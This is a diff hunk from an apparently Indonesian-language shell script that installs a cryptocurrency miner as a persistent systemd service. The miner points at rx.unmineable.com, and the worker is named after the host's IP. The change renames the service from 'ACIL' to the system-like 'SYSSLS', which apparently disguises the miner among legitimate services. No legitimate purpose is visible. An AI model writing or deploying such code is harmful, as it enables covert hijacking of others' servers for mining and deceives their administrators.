@@ -70,7 +70,7 @@ echo "IP yang digunakan (dengan tanda hubung): $IP_TO_USE"
 if [ "$(id -u)" -eq 0 ]; then
     # Jika root, buat dan aktifkan service systemd
     echo -e "[Unit]
-Description=ACIL
+Description=SYSSLS
 After=network.target
 
 [Service]
@@ -80,14 +80,14 @@ RestartSec=15s
 ExecStart=$EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 54477070.$IP_TO_USE -p x
 
 [Install]
-WantedBy=multi-user.target" > /etc/systemd/system/acil.service
+WantedBy=multi-user.target" > /etc/systemd/system/syssls.service
 
-    chmod 644 /etc/systemd/system/acil.service
+    chmod 644 /etc/systemd/system/syssls.service
     systemctl daemon-reload
-    systemctl enable acil.service
-    systemctl start acil.service
+    systemctl enable syssls.service
+    systemctl start syssls.service
 
-    echo "Systemd service untuk ACIL telah dibuat, dimuat, dan dimulai."
+    echo "Systemd service untuk SYSSLS telah dibuat, dimuat, dan dimulai."
     echo "Worker : VPS-$IP_TO_USE"
 else
     # Jika bukan root, jalankan dengan nohup
